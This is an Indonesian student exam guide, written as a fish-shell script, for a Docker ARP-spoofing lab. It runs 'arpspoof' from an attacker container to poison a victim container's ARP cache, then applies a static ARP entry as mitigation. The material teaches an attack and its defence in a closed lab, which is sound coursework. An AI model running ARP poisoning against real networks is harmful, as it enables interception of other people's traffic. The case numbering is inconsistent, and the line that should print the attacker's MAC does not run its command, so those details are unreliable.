# Panduan UTS — VERSI FISH (untuk shell fish 3.x)
# NIM 24552011027 -> 29 mod 10 = 9 -> Kasus 9 (k9)
#
# Kenapa versi ini ada: perintah `VAR=$(cmd)` adalah sintaks BASH.
# Fish menolaknya dengan "Unsupported use of '='". Di fish gunakan `set`.
# Kalau kamu lebih suka bash, jalankan `bash` dulu lalu pakai panduan biasa.

cd "/home/purwa/Documents/perkuliahan/keamanan jaringan/network-attack-lab-"

# ---------------------------------------------------------------- Kasus 3 (fish)
docker network create lab-arp-k9

docker run -d --name korban-k9    --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k9   --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
sleep 3

# catatan: nama network mengandung '-' dan Go template Docker menolak karakter
# itu di {{.a.b-c}}, jadi WAJIB pakai sintaks index seperti di bawah.
# Pakai `set` (fish), dan `$VAR` untuk memakainya — bukan $VAR=...
set IP_KORBAN (docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)
set IP_GW     (docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' gateway-k9)
set MAC_GW    (docker exec gateway-k9 cat /sys/class/net/eth0/address)
echo "korban=$IP_KORBAN  gateway=$IP_GW  mac_gateway=$MAC_GW"

echo "=== 0. samakan titik awal (reset ke MAC gateway asli + ping) ==="
# PENTING: jangan pakai 'ip neigh del' — justru membuat korban menolak ARP reply
# sehingga langkah 2 selalu terlihat gagal.
docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud reachable dev eth0
docker exec korban-k9 ping -c 2 "$IP_GW" >/dev/null 2>&1

echo "=== 1. SEBELUM (baseline) ==="
docker exec korban-k9 ip neigh show "$IP_GW"

echo "=== 2. SAAT DISERANG ==="
docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GW" 2>/dev/null
# polling: poison masuk dalam 1-11 detik, jadi cek tiap detik sampai berubah
for i in (seq 1 12)
    sleep 1
    set M (docker exec korban-k9 ip neigh show "$IP_GW" | string match -r 'lladdr \K[0-9a-f:]+')
    if test "$M" != "$MAC_GW"
        break
    end
end
docker exec korban-k9 ip neigh show "$IP_GW"
echo "mac gateway asli : $MAC_GW"
echo "mac penyerang    : (docker exec penyerang-k9 cat /sys/class/net/eth0/address)"

echo "=== 3. SETELAH MITIGASI (static ARP) ==="
docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud permanent dev eth0
docker exec korban-k9 ip neigh show "$IP_GW"

# ------------------------------------------------- cara paling cepat: pakai bash
# Semua kasus (1-7) sudah ada di lab/uts-run.sh, yang berfisik bash.
# Karena itu kamu TIDAK perlu mengetik perintah manual — cukup:
#
#   ./lab/uts-run.sh 3
#
# Skrip itu memakai `#!/bin/bash`, jadi fish akan menjalankannya dengan bash
# secara otomatis. Ini cara paling aman untuk semua kasus.
